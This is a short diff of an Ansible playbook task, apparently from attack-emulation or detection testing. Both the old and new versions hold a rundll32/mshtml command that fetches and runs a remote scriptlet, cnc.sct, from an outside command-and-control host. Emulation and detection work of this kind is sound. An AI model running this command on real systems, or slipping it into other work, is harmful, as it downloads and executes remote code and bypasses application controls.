@@ -6,7 +6,7 @@
   tasks:
     - name: Run Rundll32 to download and execute script (create a new file evil.sct)
       win_shell: |
-        rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://cnc-nuance.eastus.cloudapp.azure.com:443/cnc.sct");window.close();
+        rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://cnc-nuance.eastus.cloudapp.azure.com:443/cnc.sct");window.close();
     - name: check file exist
       tags: always
       win_stat:
